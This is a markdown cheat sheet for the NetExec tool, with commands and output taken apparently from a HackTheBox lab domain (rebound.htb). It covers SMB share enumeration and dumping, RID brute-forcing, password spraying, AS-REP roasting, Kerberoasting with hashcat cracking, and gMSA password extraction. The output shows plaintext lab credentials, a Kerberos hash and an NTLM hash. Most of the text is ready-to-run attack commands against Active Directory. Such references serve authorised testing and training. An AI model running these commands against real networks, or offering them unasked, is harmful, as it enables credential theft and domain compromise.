## # `Installation & Wiki` -

```bash
sudo apt install pipx git
pipx ensurepath
pipx install git+https://github.com/Pennyw0rth/NetExec
```

[Netexec](https://github.com/Pennyw0rth/NetExec)

[netexec.wiki](https://www.netexec.wiki/)

## # `SMB` -

- <mark style="background: #3D7EFFA6;">Host Enumeration</mark> :

```bash
oxdf@hacky$ netexec smb 10.10.11.231
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
```

- <mark style="background: #FFB86CA6;">Authentication</mark> :

```bash
oxdf@hacky$ netexec smb rebound.htb -u ldap_monitor -p '1GR8t@$$4u' 
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$$4u 
```

---

- <mark style="background: #07E997A6;">Listing Shares with null authentication</mark> :

```bash
oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' --shares
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SMB         10.10.11.231    445    DC01             [*] Enumerated shares
SMB         10.10.11.231    445    DC01             Share           Permissions     Remark
SMB         10.10.11.231    445    DC01             -----           -----------     ------
SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.231    445    DC01             C$                              Default share
SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.231    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.231    445    DC01             Shared          READ            
SMB         10.10.11.231    445    DC01             SYSVOL                          Logon server share
```


- <mark style="background: #D2B3FFA6;">List and dump all files from all readable shares</mark> :

```bash
oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' -M spider_plus
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SPIDER_P... 10.10.11.231    445    DC01             [*] Started module spidering_plus with the following options:
SPIDER_P... 10.10.11.231    445    DC01             [*]  DOWNLOAD_FLAG: False
SPIDER_P... 10.10.11.231    445    DC01             [*]     STATS_FLAG: True
SPIDER_P... 10.10.11.231    445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_P... 10.10.11.231    445    DC01             [*]   EXCLUDE_EXTS: ['ico', 'lnk']
SPIDER_P... 10.10.11.231    445    DC01             [*]  MAX_FILE_SIZE: 50 KB
SPIDER_P... 10.10.11.231    445    DC01             [*]  OUTPUT_FOLDER: /tmp/nxc_spider_plus
SMB         10.10.11.231    445    DC01             [*] Enumerated shares
SMB         10.10.11.231    445    DC01             Share           Permissions     Remark
SMB         10.10.11.231    445    DC01             -----           -----------     ------
SMB         10.10.11.231    445    DC01             ADMIN$                          Remote Admin
SMB         10.10.11.231    445    DC01             C$                              Default share
SMB         10.10.11.231    445    DC01             IPC$            READ            Remote IPC
SMB         10.10.11.231    445    DC01             NETLOGON                        Logon server share 
SMB         10.10.11.231    445    DC01             Shared          READ            
SMB         10.10.11.231    445    DC01             SYSVOL                          Logon server share 
SPIDER_P... 10.10.11.231    445    DC01             [+] Saved share-file metadata to "/tmp/nxc_spider_plus/10.10.11.231.json".
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shared, SYSVOL)
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Readable Shares:  2 (IPC$, Shared)
SPIDER_P... 10.10.11.231    445    DC01             [*] SMB Filtered Shares:  1
```

- <mark style="background: #E632B3A6;">Dumping All Files</mark> :

```bash
nxc smb 10.10.10.10 -u 'user' -p 'pass' -M spider_plus -o DOWNLOAD_FLAG=True
```

---

- <mark style="background: #07E997A6;">Enumerate users by bruteforcing the RID on the remote target</mark> :

```bash
oxdf@hacky$ netexec smb 10.10.11.231 -u guest -p '' --rid-brute
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.231    445    DC01             [+] rebound.htb\guest: 
SMB         10.10.11.231    445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.10.11.231    445    DC01             500: rebound\Administrator (SidTypeUser)
SMB         10.10.11.231    445    DC01             501: rebound\Guest (SidTypeUser)
SMB         10.10.11.231    445    DC01             502: rebound\krbtgt (SidTypeUser)
SMB         10.10.11.231    445    DC01             512: rebound\Domain Admins (SidTypeGroup)
SMB         10.10.11.231    445    DC01             513: rebound\Domain Users (SidTypeGroup)
SMB         10.10.11.231    445    DC01             514: rebound\Domain Guests (SidTypeGroup)
```

By default, typical RID cycle attacks go up to RID 4000.For more you can use `--rid-brute 10000` as option.

---

## # `Winrm` -

- <mark style="background: #3D7EFFA6;">Authentication</mark> :

```bash
oxdf@hacky$ netexec winrm rebound.htb -u ldap_monitor -p '1GR8t@$$4u' 
WINRM       10.10.11.231    5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:rebound.htb)
WINRM       10.10.11.231    5985   DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
```

---

## # `LDAP` -

- <mark style="background: #3D7EFFA6;">Authentication</mark> :

```bash
oxdf@hacky$ netexec ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u'
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             [-] rebound.htb\ldap_monitor:1GR8t@$$4u
```

- <mark style="background: #FFB86CA6;">Using Kerberos</mark> :

```bash
oxdf@hacky$ netexec ldap rebound.htb -u ldap_monitor -p '1GR8t@$$4u' -k
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAPS       rebound.htb     636    DC01             [+] rebound.htb\ldap_monitor
```

---

## # `Password Spray` -

- <mark style="background: #3D7EFFA6;">Simple Password Spray</mark> :

```bash
oxdf@hacky$ nxc wmi 192.168.1.0/24 -u userfile -p passwordfile
```

By default nxc will exit after a successful login is found.

- <mark style="background: #FFB86CA6;">Password spraying (without bruteforce)</mark> :

```bash
oxdf@hacky$ nxc wmi 192.168.1.0/24 -u userfile -p passwordfile --no-bruteforce
```

- <mark style="background: #D2B3FFA6;">Keep going even after it found one successful login</mark> :

```bash
oxdf@hacky$ netexec smb rebound.htb -u users -p '1GR8t@$$4u' --continue-on-success
```

Using the `--continue-on-success` flag will continue spraying even after a valid password is found. Useful for spraying a single password against a large user list.

---

## # `ASREPRoast` -

Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required.

<mark style="background: #3D7EFFA6;">Without authentication</mark> :

```bash
oxdf@hacky$ netexec ldap 10.10.11.231 -u users -p '' --asreproast asrephashes.txt
SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.231    445    DC01             $krb5asrep$23$jjones@REBOUND.HTB:878af35ccf86b307eeddf59caca892d0$1157eef31c59fa390193a36b8bd8fd1d82a61e3fd7d2a98b1cd96f367560cb8700223e8030bfc0c516c1e206f06d820c7ac1999303a00086701f208278a9539732375c79e695d240dad1b0095e17843dce414b027193697e5e4fdd5f58a6ca9fe2c9fe26fe7fbff034d4ad5c8e4fb1b4fe3b5cbfb6b2d719fa6c99c4fc5a0c8740779cda6c124ee7810a3b14be4b829057f8740218b746fd3ebb572852225f8845d883b3c3f3065206ac29b60b457e4c1e7d90c533e7144f38c2feabcb783e4e9b808f9485328feb46f1b6ae164ef68de2c6dee9d89b77d0e398b36d828b1fe3a6104c336412095cb1bc
```

<mark style="background: #FFB86CA6;">With authentication</mark> :

If you have one valid credential on the domain, you can retrieve all the users and hashes where the Kerberos pre-authentication is not required :

```bash
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```

Cracking with hashcat :

```bash
hashcat -m18200 output.txt wordlist
```


---

## # `Kerberoasting` -

Retrieve the Kerberos 5 TGS-REP etype 23 hash using Kerberoasting.

```bash
nxc ldap 192.168.0.104 -u harry -p pass --kerberoasting output.txt
```

Cracking with hashcat :

```bash
hashcat -m13100 output.txt wordlist.txt
```

---

## # `Dump gMSA` -

Using the protocol LDAP you can extract the password of a gMSA account if you have the right :

```bash
oxdf@hacky$ netexec ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa
SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)
LDAP        rebound.htb     636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda 
LDAP        rebound.htb     636    DC01             [*] Getting GMSA Passwords
LDAP        rebound.htb     636    DC01             Account: delegator$           NTLM: e1630b0e18242439a50e9d8b5f5b7524
```

---

